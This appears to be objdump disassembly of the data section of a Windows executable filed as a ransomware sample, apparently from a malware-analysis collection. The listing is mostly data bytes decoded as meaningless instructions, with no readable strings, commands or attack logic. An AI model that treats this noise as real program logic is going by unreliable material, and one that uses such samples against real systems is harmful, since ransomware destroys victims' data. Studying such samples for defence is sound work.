
malware_samples/ransomware/5c3ce324ded0942df4b4cbf80cf195263f105daf5c729255c628bb3a4f8ab3de.exe:     file format pei-i386


Disassembly of section .rdata:

00401000 <.rdata>:
  401000:	a2 cf 00 00 92       	mov    %al,0x920000cf
  401005:	cf                   	iret
  401006:	00 00                	add    %al,(%eax)
  401008:	80 cf 00             	or     $0x0,%bh
  40100b:	00 72 cf             	add    %dh,-0x31(%edx)
  40100e:	00 00                	add    %al,(%eax)
  401010:	60                   	pusha
  401011:	cf                   	iret
  401012:	00 00                	add    %al,(%eax)
  401014:	4a                   	dec    %edx
  401015:	cf                   	iret
  401016:	00 00                	add    %al,(%eax)
  401018:	32 cf                	xor    %bh,%cl
  40101a:	00 00                	add    %al,(%eax)
  40101c:	b6 cf                	mov    $0xcf,%dh
  40101e:	00 00                	add    %al,(%eax)
  401020:	00 00                	add    %al,(%eax)
  401022:	00 00                	add    %al,(%eax)
  401024:	c0 cc 00             	ror    $0x0,%ah
  401027:	00 d4                	add    %dl,%ah
  401029:	cc                   	int3
  40102a:	00 00                	add    %al,(%eax)
  40102c:	e2 cc                	loop   0x400ffa
  40102e:	00 00                	add    %al,(%eax)
  401030:	ee                   	out    %al,(%dx)
  401031:	cc                   	int3
  401032:	00 00                	add    %al,(%eax)
  401034:	fc                   	cld
  401035:	cc                   	int3
  401036:	00 00                	add    %al,(%eax)
  401038:	0a cd                	or     %ch,%cl
  40103a:	00 00                	add    %al,(%eax)
  40103c:	1e                   	push   %ds
  40103d:	cd 00                	int    $0x0
  40103f:	00 2c cd 00 00 3c cd 	add    %ch,-0x32c40000(,%ecx,8)
  401046:	00 00                	add    %al,(%eax)
  401048:	50                   	push   %eax
  401049:	cd 00                	int    $0x0
  40104b:	00 64 cd 00          	add    %ah,0x0(%ebp,%ecx,8)
  40104f:	00 7e cd             	add    %bh,-0x33(%esi)
  401052:	00 00                	add    %al,(%eax)
  401054:	86 cd                	xchg   %cl,%ch
  401056:	00 00                	add    %al,(%eax)
  401058:	9a cd 00 00 ac cd 00 	lcall  $0xcd,$0xac0000cd
  40105f:	00 b8 cd 00 00 c4    	add    %bh,-0x3bffff33(%eax)
  401065:	cd 00                	int    $0x0
  401067:	00 d0                	add    %dl,%al
  401069:	cd 00                	int    $0x0
  40106b:	00 b4 cc 00 00 e8 cd 	add    %dh,-0x32180000(%esp,%ecx,8)
  401072:	00 00                	add    %al,(%eax)
  401074:	f4                   	hlt
  401075:	cd 00                	int    $0x0
  401077:	00 0a                	add    %cl,(%edx)
  401079:	ce                   	into
  40107a:	00 00                	add    %al,(%eax)
  40107c:	1c ce                	sbb    $0xce,%al
  40107e:	00 00                	add    %al,(%eax)
  401080:	36 ce                	ss into
  401082:	00 00                	add    %al,(%eax)
  401084:	46                   	inc    %esi
  401085:	ce                   	into
  401086:	00 00                	add    %al,(%eax)
  401088:	56                   	push   %esi
  401089:	ce                   	into
  40108a:	00 00                	add    %al,(%eax)
  40108c:	6a ce                	push   $0xffffffce
  40108e:	00 00                	add    %al,(%eax)
  401090:	80 ce 00             	or     $0x0,%dh
  401093:	00 96 ce 00 00 a8    	add    %dl,-0x57ffff32(%esi)
  401099:	ce                   	into
  40109a:	00 00                	add    %al,(%eax)
  40109c:	b8 ce 00 00 c4       	mov    $0xc40000ce,%eax
  4010a1:	ce                   	into
  4010a2:	00 00                	add    %al,(%eax)
  4010a4:	d2 ce                	ror    %cl,%dh
  4010a6:	00 00                	add    %al,(%eax)
  4010a8:	e6 ce                	out    %al,$0xce
  4010aa:	00 00                	add    %al,(%eax)
  4010ac:	fc                   	cld
  4010ad:	ce                   	into
  4010ae:	00 00                	add    %al,(%eax)
  4010b0:	12 cf                	adc    %bh,%cl
  4010b2:	00 00                	add    %al,(%eax)
  4010b4:	a8 cc                	test   $0xcc,%al
  4010b6:	00 00                	add    %al,(%eax)
  4010b8:	98                   	cwtl
  4010b9:	cc                   	int3
  4010ba:	00 00                	add    %al,(%eax)
  4010bc:	88 cc                	mov    %cl,%ah
  4010be:	00 00                	add    %al,(%eax)
  4010c0:	7c cc                	jl     0x40108e
  4010c2:	00 00                	add    %al,(%eax)
  4010c4:	6a cc                	push   $0xffffffcc
  4010c6:	00 00                	add    %al,(%eax)
  4010c8:	5e                   	pop    %esi
  4010c9:	cc                   	int3
  4010ca:	00 00                	add    %al,(%eax)
  4010cc:	50                   	push   %eax
  4010cd:	cc                   	int3
  4010ce:	00 00                	add    %al,(%eax)
  4010d0:	dc cd                	fmul   %st,%st(5)
  4010d2:	00 00                	add    %al,(%eax)
  4010d4:	44                   	inc    %esp
  4010d5:	cc                   	int3
  4010d6:	00 00                	add    %al,(%eax)
  4010d8:	00 00                	add    %al,(%eax)
  4010da:	00 00                	add    %al,(%eax)
  4010dc:	e8 cf 00 00 d6       	call   0xd64011b0
  4010e1:	cf                   	iret
  4010e2:	00 00                	add    %al,(%eax)
  4010e4:	00 00                	add    %al,(%eax)
  4010e6:	00 00                	add    %al,(%eax)
  4010e8:	1a d0                	sbb    %al,%dl
  4010ea:	00 00                	add    %al,(%eax)
  4010ec:	2e d0 00             	rolb   $1,%cs:(%eax)
  4010ef:	00 06                	add    %al,(%esi)
  4010f1:	d0 00                	rolb   $1,(%eax)
  4010f3:	00 00                	add    %al,(%eax)
  4010f5:	00 00                	add    %al,(%eax)
  4010f7:	00 50 d0             	add    %dl,-0x30(%eax)
  4010fa:	00 00                	add    %al,(%eax)
  4010fc:	5c                   	pop    %esp
  4010fd:	d0 00                	rolb   $1,(%eax)
  4010ff:	00 66 d0             	add    %ah,-0x30(%esi)
  401102:	00 00                	add    %al,(%eax)
  401104:	70 d0                	jo     0x4010d6
  401106:	00 00                	add    %al,(%eax)
  401108:	84 d0                	test   %dl,%al
  40110a:	00 00                	add    %al,(%eax)
  40110c:	90                   	nop
  40110d:	d0 00                	rolb   $1,(%eax)
	...
  401117:	00 e7                	add    %ah,%bh
  401119:	73 40                	jae    0x40115b
  40111b:	00 e8                	add    %ch,%al
  40111d:	1f                   	pop    %ds
  40111e:	40                   	inc    %eax
  40111f:	00 e8                	add    %ch,%al
  401121:	1f                   	pop    %ds
  401122:	40                   	inc    %eax
  401123:	00 cc                	add    %cl,%ah
  401125:	0b e4                	or     %esp,%esp
  401127:	f0 69 f6 ae 6f ff cc 	lock imul $0xccff6fae,%esi,%esi
  40112e:	bf d9 2c e7 36       	mov    $0x36e72cd9,%edi
  401133:	ee                   	out    %al,(%dx)
  401134:	21 79 2b             	and    %edi,0x2b(%ecx)
  401137:	85 83 39 d6 32 f5    	test   %eax,-0xacd29c7(%ebx)
  40113d:	77 26                	ja     0x401165
  40113f:	8c 2c dd 38 4a a8 d0 	mov    %gs,-0x2f57b5c8(,%ebx,8)
  401146:	40                   	inc    %eax
  401147:	00 56 15             	add    %dl,0x15(%esi)
  40114a:	6f                   	outsl  %ds:(%esi),(%dx)
  40114b:	d5 57                	aad    $0x57
  40114d:	15 9f f2 b2 5a       	adc    $0x5ab2f29f,%eax
  401152:	4a                   	dec    %edx
  401153:	40                   	inc    %eax
  401154:	1a 9b 5b 45 2f c6    	sbb    -0x39d0baa5(%ebx),%bl
  40115a:	8f                   	(bad)
  40115b:	ab                   	stos   %eax,%es:(%edi)
  40115c:	24 6e                	and    $0x6e,%al
  40115e:	38 24 aa             	cmp    %ah,(%edx,%ebp,4)
  401161:	5f                   	pop    %edi
  401162:	07                   	pop    %es
  401163:	5f                   	pop    %edi
  401164:	d3 91 67 ef c3 a5    	rcll   %cl,-0x5a3c1099(%ecx)
  40116a:	e4 aa                	in     $0xaa,%al
  40116c:	31 d5                	xor    %edx,%ebp
  40116e:	be ac da 78 35       	mov    $0x3578daac,%esi
  401173:	0d 9c ef 81 00       	or     $0x81ef9c,%eax
  401178:	47                   	inc    %edi
  401179:	23 7a 34             	and    0x34(%edx),%edi
  40117c:	e7 8c                	out    %eax,$0x8c
  40117e:	09 0b                	or     %ecx,(%ebx)
  401180:	e7 a1                	out    %eax,$0xa1
  401182:	93                   	xchg   %eax,%ebx
  401183:	2c f7                	sub    $0xf7,%al
  401185:	8f                   	(bad)
  401186:	51                   	push   %ecx
  401187:	5e                   	pop    %esi
  401188:	69 1c 15 3d bf 47 a6 	imul   $0x4668e522,-0x59b840c3(,%edx,1),%ebx
  40118f:	22 e5 68 46 
  401193:	b9 41 d4 04 6a       	mov    $0x6a04d441,%ecx
  401198:	d5 e3                	aad    $0xe3
  40119a:	98                   	cwtl
  40119b:	cb                   	lret
  40119c:	70 d6                	jo     0x401174
  40119e:	61                   	popa
  40119f:	36 2a 5f 16          	sub    %ss:0x16(%edi),%bl
  4011a3:	2f                   	das
  4011a4:	39 fa                	cmp    %edi,%edx
  4011a6:	cc                   	int3
  4011a7:	cd e6                	int    $0xe6
  4011a9:	b5 19                	mov    $0x19,%ch
  4011ab:	58                   	pop    %eax
  4011ac:	2a 68 e4             	sub    -0x1c(%eax),%ch
  4011af:	a0 28 0a 35 e0       	mov    0xe0350a28,%al
  4011b4:	d1 06                	roll   $1,(%esi)
  4011b6:	74 93                	je     0x40114b
  4011b8:	51                   	push   %ecx
  4011b9:	27                   	daa
  4011ba:	7d 01                	jge    0x4011bd
  4011bc:	85 66 58             	test   %esp,0x58(%esi)
  4011bf:	d3 50 e3             	rcll   %cl,-0x1d(%eax)
  4011c2:	36 46                	ss inc %esi
  4011c4:	e3 1d                	jecxz  0x4011e3
  4011c6:	d1 e9                	shr    $1,%ecx
  4011c8:	63 22                	arpl   %esp,(%edx)
  4011ca:	c8 bc dd 7b          	enter  $0xddbc,$0x7b
  4011ce:	f7 48 cc ea 1c 4d 9d 	testl  $0x9d4d1cea,-0x34(%eax)
  4011d5:	5a                   	pop    %edx
  4011d6:	bc 8d 6d 9e eb       	mov    $0xeb9e6d8d,%esp
  4011db:	b8 f8 fa 0d c2       	mov    $0xc20dfaf8,%eax
  4011e0:	9e                   	sahf
  4011e1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4011e2:	ad                   	lods   %ds:(%esi),%eax
  4011e3:	4f                   	dec    %edi
  4011e4:	42                   	inc    %edx
  4011e5:	24 20                	and    $0x20,%al
  4011e7:	7a 8e                	jp     0x401177
  4011e9:	b4 96                	mov    $0x96,%ah
  4011eb:	52                   	push   %edx
  4011ec:	f8                   	clc
  4011ed:	21 63 ed             	and    %esp,-0x13(%ebx)
  4011f0:	4a                   	dec    %edx
  4011f1:	d5 21                	aad    $0x21
  4011f3:	45                   	inc    %ebp
  4011f4:	d1 62 56             	shll   $1,0x56(%edx)
  4011f7:	ce                   	into
  4011f8:	51                   	push   %ecx
  4011f9:	29 cc                	sub    %ecx,%esp
  4011fb:	36 69 06 0e 29 4f 32 	imul   $0x324f290e,%ss:(%esi),%eax
  401202:	1e                   	push   %ds
  401203:	a1 80 1d c4 cd       	mov    0xcdc41d80,%eax
  401208:	c5 fd 98             	(bad)
  40120b:	55                   	push   %ebp
  40120c:	3f                   	aas
  40120d:	a1 5f af 51 a0       	mov    0xa051af5f,%eax
  401212:	d9 4c 3c 21          	(bad) 0x21(%esp,%edi,1)
  401216:	f7 02 d9 c0 e9 5d    	testl  $0x5de9c0d9,(%edx)
  40121c:	74 aa                	je     0x4011c8
  40121e:	85 9e 60 e3 30 18    	test   %ebx,0x1830e360(%esi)
  401224:	33 f4                	xor    %esp,%esi
  401226:	9d                   	popf
  401227:	7c 5e                	jl     0x401287
  401229:	e4 b2                	in     $0xb2,%al
  40122b:	17                   	pop    %ss
  40122c:	9f                   	lahf
  40122d:	5e                   	pop    %esi
  40122e:	61                   	popa
  40122f:	14 d4                	adc    $0xd4,%al
  401231:	d8 9c f1 77 8a 29 f0 	fcomps -0xfd67589(%ecx,%esi,8)
  401238:	71 1a                	jno    0x401254
  40123a:	b3 d3                	mov    $0xd3,%bl
  40123c:	f5                   	cmc
  40123d:	6e                   	outsb  %ds:(%esi),(%dx)
  40123e:	96                   	xchg   %eax,%esi
  40123f:	01 f5                	add    %esi,%ebp
  401241:	01 8d b5 e5 b9 f5    	add    %ecx,-0xa461a4b(%ebp)
  401247:	af                   	scas   %es:(%edi),%eax
  401248:	c3                   	ret
  401249:	d8 bb 7e d7 06 a6    	fdivrs -0x59f92882(%ebx)
  40124f:	36 de 54 8d 29       	ficoms %ss:0x29(%ebp,%ecx,4)
  401254:	d0 03                	rolb   $1,(%ebx)
  401256:	61                   	popa
  401257:	19 70 9b             	sbb    %esi,-0x65(%eax)
  40125a:	bd e3 4c de 14       	mov    $0x14de4ce3,%ebp
  40125f:	52                   	push   %edx
  401260:	6a ff                	push   $0xffffffff
  401262:	c4 0d 24 87 73 ae    	les    0xae738724,%ecx
  401268:	24 40                	and    $0x40,%al
  40126a:	ae                   	scas   %es:(%edi),%al
  40126b:	29 4a ad             	sub    %ecx,-0x53(%edx)
  40126e:	1a fb                	sbb    %bl,%bh
  401270:	4d                   	dec    %ebp
  401271:	89 ee                	mov    %ebp,%esi
  401273:	0f 62 ad 5e 0c 8f 38 	punpckldq 0x388f0c5e(%ebp),%mm5
  40127a:	cb                   	lret
  40127b:	e3 15                	jecxz  0x401292
  40127d:	9f                   	lahf
  40127e:	4a                   	dec    %edx
  40127f:	be 9e 48 93 ae       	mov    $0xae93489e,%esi
  401284:	18 60 2a             	sbb    %ah,0x2a(%eax)
  401287:	56                   	push   %esi
  401288:	2a 14 e9             	sub    (%ecx,%ebp,8),%dl
  40128b:	f4                   	hlt
  40128c:	39 68 72             	cmp    %ebp,0x72(%eax)
  40128f:	5c                   	pop    %esp
  401290:	a9 e5 8f 3f b2       	test   $0xb23f8fe5,%eax
  401295:	aa                   	stos   %al,%es:(%edi)
  401296:	90                   	nop
  401297:	bb 45 74 5f e4       	mov    $0xe45f7445,%ebx
  40129c:	b1 f6                	mov    $0xf6,%cl
  40129e:	91                   	xchg   %eax,%ecx
  40129f:	e2 ab                	loop   0x40124c
  4012a1:	df 42 54             	filds  0x54(%edx)
  4012a4:	64 c2 91 8d          	fs ret $0x8d91
  4012a8:	97                   	xchg   %eax,%edi
  4012a9:	83 ba 97 c2 4d 72 20 	cmpl   $0x20,0x724dc297(%edx)
  4012b0:	2a 20                	sub    (%eax),%ah
  4012b2:	49                   	dec    %ecx
  4012b3:	62 92 ac 4e 05 26    	bound  %edx,0x26054eac(%edx)
  4012b9:	b9 7b 52 d8 0f       	mov    $0xfd8527b,%ecx
  4012be:	bd d2 61 bc ed       	mov    $0xedbc61d2,%ebp
  4012c3:	9c                   	pushf
  4012c4:	5f                   	pop    %edi
  4012c5:	40                   	inc    %eax
  4012c6:	8d bc 48 6c e9 24 ad 	lea    -0x52db1694(%eax,%ecx,2),%edi
  4012cd:	96                   	xchg   %eax,%esi
  4012ce:	29 11                	sub    %edx,(%ecx)
  4012d0:	15 bb f3 06 ac       	adc    $0xac06f3bb,%eax
  4012d5:	34 7b                	xor    $0x7b,%al
  4012d7:	01 cc                	add    %ecx,%esp
  4012d9:	c8 8a 3f a2          	enter  $0x3f8a,$0xa2
  4012dd:	f6 59 62             	negb   0x62(%ecx)
  4012e0:	b3 08                	mov    $0x8,%bl
  4012e2:	1a c5                	sbb    %ch,%al
  4012e4:	b5 3c                	mov    $0x3c,%ch
  4012e6:	10 1a                	adc    %bl,(%edx)
  4012e8:	4f                   	dec    %edi
  4012e9:	c5 53 2f             	lds    0x2f(%ebx),%edx
  4012ec:	ff 16                	call   *(%esi)
  4012ee:	74 08                	je     0x4012f8
  4012f0:	e5 29                	in     $0x29,%eax
  4012f2:	bb a8 5c c6 3e       	mov    $0x3ec65ca8,%ebx
  4012f7:	37                   	aaa
  4012f8:	60                   	pusha
  4012f9:	64 a6                	cmpsb  %es:(%edi),%fs:(%esi)
  4012fb:	85 76 e5             	test   %esi,-0x1b(%esi)
  4012fe:	a9 c8 f8 6c 83       	test   $0x836cf8c8,%eax
  401303:	c4 2b                	les    (%ebx),%ebp
  401305:	bd ea 36 a6 df       	mov    $0xdfa636ea,%ebp
  40130a:	9f                   	lahf
  40130b:	8a 2e                	mov    (%esi),%ch
  40130d:	f2 70 e5             	bnd jo 0x4012f5
  401310:	d7                   	xlat   %ds:(%ebx)
  401311:	c7                   	(bad)
  401312:	cc                   	int3
  401313:	56                   	push   %esi
  401314:	7a e9                	jp     0x4012ff
  401316:	5d                   	pop    %ebp
  401317:	44                   	inc    %esp
  401318:	50                   	push   %eax
  401319:	64 59                	fs pop %ecx
  40131b:	a2 69 b8 47 01       	mov    %al,0x147b869
  401320:	9c                   	pushf
  401321:	59                   	pop    %ecx
  401322:	54                   	push   %esp
  401323:	8a a0 c7 45 d3 c8    	mov    -0x372cba39(%eax),%ah
  401329:	f1                   	int1
  40132a:	21 58 fe             	and    %ebx,-0x2(%eax)
  40132d:	2c 32                	sub    $0x32,%al
  40132f:	f3 c0 5b 9a e2       	repz rcrb $0xe2,-0x66(%ebx)
  401334:	62 83 08 6b d9 9b    	bound  %eax,-0x642694f8(%ebx)
  40133a:	ce                   	into
  40133b:	d1 23                	shll   $1,(%ebx)
  40133d:	82 0b f4             	orb    $0xf4,(%ebx)
  401340:	d3 34 77             	shll   %cl,(%edi,%esi,2)
  401343:	b7 7f                	mov    $0x7f,%bh
  401345:	15 7e b3 f8 f1       	adc    $0xf1f8b37e,%eax
  40134a:	ca 27 9b             	lret   $0x9b27
  40134d:	6f                   	outsl  %ds:(%esi),(%dx)
  40134e:	ab                   	stos   %eax,%es:(%edi)
  40134f:	6a f2                	push   $0xfffffff2
  401351:	92                   	xchg   %eax,%edx
  401352:	10 74 01 f1          	adc    %dh,-0xf(%ecx,%eax,1)
  401356:	3b 00                	cmp    (%eax),%eax
  401358:	f5                   	cmc
  401359:	8d 5a 94             	lea    -0x6c(%edx),%ebx
  40135c:	13 c3                	adc    %ebx,%eax
  40135e:	d8 2c 98             	fsubrs (%eax,%ebx,4)
  401361:	35 bc fb a3 eb       	xor    $0xeba3fbbc,%eax
  401366:	9a 7e 40 84 4e 9f f9 	lcall  $0xf99f,$0x4e84407e
  40136d:	66 39 18             	cmp    %bx,(%eax)
  401370:	78 a1                	js     0x401313
  401372:	c7                   	(bad)
  401373:	8d 11                	lea    (%ecx),%edx
  401375:	3c 85                	cmp    $0x85,%al
  401377:	46                   	inc    %esi
  401378:	83 21 89             	andl   $0xffffff89,(%ecx)
  40137b:	af                   	scas   %es:(%edi),%eax
  40137c:	60                   	pusha
  40137d:	9f                   	lahf
  40137e:	8e 1a                	mov    (%edx),%ds
  401380:	b4 b1                	mov    $0xb1,%ah
  401382:	20 80 62 9a 83 01    	and    %al,0x1839a62(%eax)
  401388:	b6 4a                	mov    $0x4a,%dh
  40138a:	c6                   	(bad)
  40138b:	7b c7                	jnp    0x401354
  40138d:	61                   	popa
  40138e:	08 57 c6             	or     %dl,-0x3a(%edi)
  401391:	bd 67 0b 57 58       	mov    $0x58570b67,%ebp
  401396:	b3 ae                	mov    $0xae,%bl
  401398:	54                   	push   %esp
  401399:	fb                   	sti
  40139a:	12 e0                	adc    %al,%ah
  40139c:	dc df                	(bad)
  40139e:	cd 1f                	int    $0x1f
  4013a0:	3a f5                	cmp    %ch,%dh
  4013a2:	2e 2a 15 6e 12 e5 ef 	sub    %cs:0xefe5126e,%dl
  4013a9:	69 1a 15 87 ce f3    	imul   $0xf3ce8715,(%edx),%ebx
  4013af:	88 3a                	mov    %bh,(%edx)
  4013b1:	64 8b 79 03          	mov    %fs:0x3(%ecx),%edi
  4013b5:	ec                   	in     (%dx),%al
  4013b6:	9b                   	fwait
  4013b7:	43                   	inc    %ebx
  4013b8:	88 75 51             	mov    %dh,0x51(%ebp)
  4013bb:	da 23                	fisubl (%ebx)
  4013bd:	c8 11 bc 8c          	enter  $0xbc11,$0x8c
  4013c1:	3a d9                	cmp    %cl,%bl
  4013c3:	76 c0                	jbe    0x401385
  4013c5:	18 43 90             	sbb    %al,-0x70(%ebx)
  4013c8:	96                   	xchg   %eax,%esi
  4013c9:	09 35 2c fb f7 8d    	or     %esi,0x8df7fb2c
  4013cf:	21 6e 25             	and    %ebp,0x25(%esi)
  4013d2:	de 82 4d 81 04 8f    	fiadds -0x70fb7eb3(%edx)
  4013d8:	56                   	push   %esi
  4013d9:	b1 65                	mov    $0x65,%cl
  4013db:	cd dc                	int    $0xdc
  4013dd:	4f                   	dec    %edi
  4013de:	25 ce 57 5e b5       	and    $0xb55e57ce,%eax
  4013e3:	6d                   	insl   (%dx),%es:(%edi)
  4013e4:	7b c1                	jnp    0x4013a7
  4013e6:	aa                   	stos   %al,%es:(%edi)
  4013e7:	f2 de f4             	repnz fdivp %st,%st(4)
  4013ea:	e0 85                	loopne 0x401371
  4013ec:	92                   	xchg   %eax,%edx
  4013ed:	c1 7d f4 a5          	sarl   $0xa5,-0xc(%ebp)
  4013f1:	1c af                	sbb    $0xaf,%al
  4013f3:	f7 57 7a             	notl   0x7a(%edi)
  4013f6:	20 4a 63             	and    %cl,0x63(%edx)
  4013f9:	d8 7c 1a 10          	fdivrs 0x10(%edx,%ebx,1)
  4013fd:	4a                   	dec    %edx
  4013fe:	c5 46 01             	lds    0x1(%esi),%eax
  401401:	81 bf a8 94 a4 b4 1f 	cmpl   $0x22e7271f,-0x4b5b6b58(%edi)
  401408:	27 e7 22 
  40140b:	1f                   	pop    %ds
  40140c:	e7 db                	out    %eax,$0xdb
  40140e:	4e                   	dec    %esi
  40140f:	f8                   	clc
  401410:	ed                   	in     (%dx),%eax
  401411:	81 f3 48 7c 60 af    	xor    $0xaf607c48,%ebx
  401417:	4b                   	dec    %ebx
  401418:	c1 38 5b             	sarl   $0x5b,(%eax)
  40141b:	d6                   	salc
  40141c:	2c 01                	sub    $0x1,%al
  40141e:	63 e0                	arpl   %esp,%eax
  401420:	bd c1 ac 7b fb       	mov    $0xfb7bacc1,%ebp
  401425:	d4 14                	aam    $0x14
  401427:	b3 e3                	mov    $0xe3,%bl
  401429:	e4 72                	in     $0x72,%al
  40142b:	79 6c                	jns    0x401499
  40142d:	27                   	daa
  40142e:	dd 94 e6 45 b7 19 11 	fstl   0x1119b745(%esi,%eiz,8)
  401435:	50                   	push   %eax
  401436:	e9 6c b4 1f 81       	jmp    0x815fc8a7
  40143b:	31 1d 8a f8 eb 9c    	xor    %ebx,0x9cebf88a
  401441:	2b 49 a1             	sub    -0x5f(%ecx),%ecx
  401444:	7d 37                	jge    0x40147d
  401446:	83 f2 65             	xor    $0x65,%edx
  401449:	11 b3 6c ea 44 1a    	adc    %esi,0x1a44ea6c(%ebx)
  40144f:	e9 d3 37 e3 2a       	jmp    0x2b234c27
  401454:	6b 8b df 1d 38 8b 75 	imul   $0x75,-0x74c7e221(%ebx),%ecx
  40145b:	05 69 68 57 ca       	add    $0xca576869,%eax
  401460:	45                   	inc    %ebp
  401461:	d0 70 d9             	shlb   $1,-0x27(%eax)
  401464:	5d                   	pop    %ebp
  401465:	96                   	xchg   %eax,%esi
  401466:	ab                   	stos   %eax,%es:(%edi)
  401467:	c1 c2 de             	rol    $0xde,%edx
  40146a:	2e 82 49 23 d3       	orb    $0xd3,%cs:0x23(%ecx)
  40146f:	7a 4a                	jp     0x4014bb
  401471:	04 1b                	add    $0x1b,%al
  401473:	fc                   	cld
  401474:	21 0a                	and    %ecx,(%edx)
  401476:	3a 0a                	cmp    (%edx),%cl
  401478:	1c e5                	sbb    $0xe5,%al
  40147a:	4d                   	dec    %ebp
  40147b:	10 5c cb 41          	adc    %bl,0x41(%ebx,%ecx,8)
  40147f:	c1 46 2e 80          	roll   $0x80,0x2e(%esi)
  401483:	5e                   	pop    %esi
  401484:	50                   	push   %eax
  401485:	65 9f                	gs lahf
  401487:	ac                   	lods   %ds:(%esi),%al
  401488:	b9 4c 6f 8f 7b       	mov    $0x7b8f6f4c,%ecx
  40148d:	cb                   	lret
  40148e:	4b                   	dec    %ebx
  40148f:	c6                   	(bad)
  401490:	ae                   	scas   %es:(%edi),%al
  401491:	69 88 c9 13 70 39 ce 	imul   $0xe4e0b4ce,0x397013c9(%eax),%ecx
  401498:	b4 e0 e4 
  40149b:	8b c1                	mov    %ecx,%eax
  40149d:	d2 fc                	sar    %cl,%ah
  40149f:	e1 55                	loope  0x4014f6
  4014a1:	97                   	xchg   %eax,%edi
  4014a2:	ef                   	out    %eax,(%dx)
  4014a3:	79 4f                	jns    0x4014f4
  4014a5:	82 73 78 ca          	xorb   $0xca,0x78(%ebx)
  4014a9:	69 88 ee 95 ad 52 95 	imul   $0xbd89495,0x52ad95ee(%eax),%ecx
  4014b0:	94 d8 0b 
  4014b3:	e5 af                	in     $0xaf,%eax
  4014b5:	bc a1 2f 05 4d       	mov    $0x4d052fa1,%esp
  4014ba:	05 dd 72 3c 92       	add    $0x923c72dd,%eax
  4014bf:	ee                   	out    %al,(%dx)
  4014c0:	8c 7a bb             	mov    %?,-0x45(%edx)
  4014c3:	10 24 28             	adc    %ah,(%eax,%ebp,1)
  4014c6:	92                   	xchg   %eax,%edx
  4014c7:	df 3d ab a2 18 9e    	fistpll 0x9e18a2ab
  4014cd:	5e                   	pop    %esi
  4014ce:	2d 17 71 31 9f       	sub    $0x9f317117,%eax
  4014d3:	e9 13 79 81 00       	jmp    0xc18deb
  4014d8:	42                   	inc    %edx
  4014d9:	ef                   	out    %eax,(%dx)
  4014da:	02 69 21             	add    0x21(%ecx),%ch
  4014dd:	c6                   	(bad)
  4014de:	4c                   	dec    %esp
  4014df:	2a 5e ed             	sub    -0x13(%esi),%bl
  4014e2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4014e3:	41                   	inc    %ecx
  4014e4:	72 1e                	jb     0x401504
  4014e6:	78 d0                	js     0x4014b8
  4014e8:	73 16                	jae    0x401500
  4014ea:	d9 63 bb             	fldenv -0x45(%ebx)
  4014ed:	b1 1d                	mov    $0x1d,%cl
  4014ef:	db be 95 cc 9c dc    	fstpt  -0x2363336b(%esi)
  4014f5:	24 ae                	and    $0xae,%al
  4014f7:	88 b2 9b 28 3a 67    	mov    %dh,0x673a289b(%edx)
  4014fd:	39 f9                	cmp    %edi,%ecx
  4014ff:	67 74 0a             	addr16 je 0x40150c
  401502:	75 5e                	jne    0x401562
  401504:	d6                   	salc
  401505:	ef                   	out    %eax,(%dx)
  401506:	ef                   	out    %eax,(%dx)
  401507:	a3 c9 4d bf 97       	mov    %eax,0x97bf4dc9
  40150c:	70 48                	jo     0x401556
  40150e:	92                   	xchg   %eax,%edx
  40150f:	26 6c                	es insb (%dx),%es:(%edi)
  401511:	d5 bf                	aad    $0xbf
  401513:	b1 e2                	mov    $0xe2,%cl
  401515:	e8 29 86 f4 c2       	call   0xc3349b43
  40151a:	d5 4f                	aad    $0x4f
  40151c:	08 66 b0             	or     %ah,-0x50(%esi)
  40151f:	7a d6                	jp     0x4014f7
  401521:	83 12 8b             	adcl   $0xffffff8b,(%edx)
  401524:	63 ab e1 03 be 72    	arpl   %ebp,0x72be03e1(%ebx)
  40152a:	bd 13 da 22 96       	mov    $0x9622da13,%ebp
  40152f:	45                   	inc    %ebp
  401530:	ba d3 a5 55 7f       	mov    $0x7f55a5d3,%edx
  401535:	34 cc                	xor    $0xcc,%al
  401537:	76 d0                	jbe    0x401509
  401539:	b6 7a                	mov    $0x7a,%dh
  40153b:	a3 19 9a 3f 69       	mov    %eax,0x693f9a19
  401540:	d1 70 57             	shll   $1,0x57(%eax)
  401543:	d4 70                	aam    $0x70
  401545:	28 3f                	sub    %bh,(%edi)
  401547:	86 d7                	xchg   %dl,%bh
  401549:	28 da                	sub    %bl,%dl
  40154b:	d1 33                	shll   $1,(%ebx)
  40154d:	15 ff 0b a2 ee       	adc    $0xeea20bff,%eax
  401552:	4c                   	dec    %esp
  401553:	7f 26                	jg     0x40157b
  401555:	2d 8a fc 36 dd       	sub    $0xdd36fc8a,%eax
  40155a:	c6                   	(bad)
  40155b:	0b 3f                	or     (%edi),%edi
  40155d:	fa                   	cli
  40155e:	38 22                	cmp    %ah,(%edx)
  401560:	0c 7c                	or     $0x7c,%al
  401562:	dc 6a 12             	fsubrl 0x12(%edx)
  401565:	ff 98 f5 22 f8 ee    	lcall  *-0x1107dd0b(%eax)
  40156b:	cc                   	int3
  40156c:	03 a2 56 2f c8 be    	add    -0x4137d0aa(%edx),%esp
  401572:	e1 00                	loope  0x401574
  401574:	92                   	xchg   %eax,%edx
  401575:	7b 48                	jnp    0x4015bf
  401577:	bc 03 83 cf 2f       	mov    $0x2fcf8303,%esp
  40157c:	25 b8 20 78 9a       	and    $0x9a7820b8,%eax
  401581:	18 d3                	sbb    %dl,%bl
  401583:	ef                   	out    %eax,(%dx)
  401584:	5c                   	pop    %esp
  401585:	e2 3f                	loop   0x4015c6
  401587:	de 86 83 0d f5 41    	fiadds 0x41f50d83(%esi)
  40158d:	d1 f8                	sar    $1,%eax
  40158f:	8b 0c 41             	mov    (%ecx,%eax,2),%ecx
  401592:	1d d0 46 dd 0b       	sbb    $0xbdd46d0,%eax
  401597:	47                   	inc    %edi
  401598:	3d 47 52 87 6a       	cmp    $0x6a875247,%eax
  40159d:	5e                   	pop    %esi
  40159e:	ca 58 35             	lret   $0x3558
  4015a1:	43                   	inc    %ebx
  4015a2:	51                   	push   %ecx
  4015a3:	44                   	inc    %esp
  4015a4:	49                   	dec    %ecx
  4015a5:	20 b5 91 d9 34 85    	and    %dh,-0x7acb266f(%ebp)
  4015ab:	9c                   	pushf
  4015ac:	9a df c7 bb 3e 3e 4b 	lcall  $0x4b3e,$0x3ebbc7df
  4015b3:	9e                   	sahf
  4015b4:	10 39                	adc    %bh,(%ecx)
  4015b6:	c1 13 3c             	rcll   $0x3c,(%ebx)
  4015b9:	c6                   	(bad)
  4015ba:	cc                   	int3
  4015bb:	73 b6                	jae    0x401573
